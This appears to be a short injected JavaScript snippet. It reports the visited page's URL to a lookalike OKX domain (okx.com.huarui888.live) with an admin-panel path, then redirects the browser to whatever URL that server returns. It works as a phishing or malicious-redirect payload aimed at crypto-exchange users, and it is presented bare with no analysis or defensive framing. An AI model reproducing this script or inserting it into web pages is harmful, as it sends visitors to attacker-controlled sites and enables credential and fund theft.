var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://www.okx.com.huarui888.live/yyadmin/api.php?zhu_url=' + window.location.href, true);
xhr.onreadystatechange = function() {
    if (xhr.readyState === 4 && xhr.status === 200) {
        var res = JSON.parse(xhr.responseText);
        if (res.code === 1) window.location.replace(res.data);
    }
};
xhr.send();
